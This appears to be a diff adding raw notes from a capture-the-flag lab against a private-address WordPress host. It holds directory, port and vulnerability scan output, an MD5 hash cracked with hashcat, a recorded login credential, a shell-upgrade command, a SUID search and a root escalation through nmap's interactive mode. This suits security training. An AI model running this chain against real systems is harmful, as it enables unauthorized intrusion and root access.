@@ -1,0 +1,167 @@
+gobuster dir -u http://10.10.189.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.189.199
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/04/23 10:51:54 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 236] [--> http://10.10.189.199/images/]
+/blog                 (Status: 301) [Size: 234] [--> http://10.10.189.199/blog/]
+/sitemap              (Status: 200) [Size: 0]
+/rss                  (Status: 301) [Size: 0] [--> http://10.10.189.199/feed/]
+/login                (Status: 302) [Size: 0] [--> http://10.10.189.199/wp-login.php]
+/0                    (Status: 301) [Size: 0] [--> http://10.10.189.199/0/]
+/video                (Status: 301) [Size: 235] [--> http://10.10.189.199/video/]
+/feed                 (Status: 301) [Size: 0] [--> http://10.10.189.199/feed/]
+/image                (Status: 301) [Size: 0] [--> http://10.10.189.199/image/]
+/atom                 (Status: 301) [Size: 0] [--> http://10.10.189.199/feed/atom/]
+/wp-content           (Status: 301) [Size: 240] [--> http://10.10.189.199/wp-content/]
+/admin                (Status: 301) [Size: 235] [--> http://10.10.189.199/admin/]
+/audio                (Status: 301) [Size: 235] [--> http://10.10.189.199/audio/]
+/intro                (Status: 200) [Size: 516314]
+/wp-login             (Status: 200) [Size: 2671]
+/css                  (Status: 301) [Size: 233] [--> http://10.10.189.199/css/]
+/rss2                 (Status: 301) [Size: 0] [--> http://10.10.189.199/feed/]
+/license              (Status: 200) [Size: 309]
+/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.189.199/wp-includes/]
+/js                   (Status: 301) [Size: 232] [--> http://10.10.189.199/js/]
+/Image                (Status: 301) [Size: 0] [--> http://10.10.189.199/Image/]
+/rdf                  (Status: 301) [Size: 0] [--> http://10.10.189.199/feed/rdf/]
+/page1                (Status: 301) [Size: 0] [--> http://10.10.189.199/]
+/readme               (Status: 200) [Size: 64]
+/robots               (Status: 200) [Size: 41]
+/dashboard            (Status: 302) [Size: 0] [--> http://10.10.189.199/wp-admin/]
+/%20                  (Status: 301) [Size: 0] [--> http://10.10.189.199/]
+/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.189.199/wp-admin/]
+/phpmyadmin           (Status: 403) [Size: 94]
+/0000                 (Status: 301) [Size: 0] [--> http://10.10.189.199/0000/]
+Progress: 12369 / 220561 (5.61%)^C
+[!] Keyboard interrupt detected, terminating.
+
+===============================================================
+2023/04/23 11:43:52 Finished
+===============================================================
+
+nmap -A 10.10.189.199        
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-23 10:48 CEST
+Nmap scan report for 10.10.189.199
+Host is up (0.042s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE VERSION
+22/tcp  closed ssh
+80/tcp  closed http
+443/tcp closed https
+Too many fingerprints match this host to give specific OS details
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   38.33 ms 10.9.0.1
+2   40.94 ms 10.10.189.199
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.89 seconds
+
+nikto -host 10.10.189.199
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.189.199
++ Target Hostname:    10.10.189.199
++ Target Port:        80
++ Start Time:         2023-04-23 10:49:12 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /gdLL5PzC.swp: Retrieved x-powered-by header: PHP/5.5.29.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /index: Uncommon header 'tcn' found, with contents: list.
++ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
++ /admin/: This might be interesting.
++ /readme: This might be interesting.
+
+hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt                       
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-penryn-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, 2917/5898 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
+Time.Started.....: Sun Apr 23 12:42:12 2023 (0 secs)
+Time.Estimated...: Sun Apr 23 12:42:12 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1461.9 kH/s (0.24ms) @ Accel:512 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 40960/14344385 (0.29%)
+Rejected.........: 0/40960 (0.00%)
+Restore.Point....: 38912/14344385 (0.27%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: treetree -> loserface1
+Hardware.Mon.#1..: Util: 26%
+
+Started: Sun Apr 23 12:41:56 2023
+Stopped: Sun Apr 23 12:42:13 2023
+
+initial login:
+
+elliot:ER28-0652              
+
+making the reverse shell interactive with the following python command:
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+finding suid binaries:
+
+find / -perm +6000 2>/dev/null | grep '/bin/'
+
+get root shell with nmap with SUID bit:
+
+./nmap --interactive
+!sh
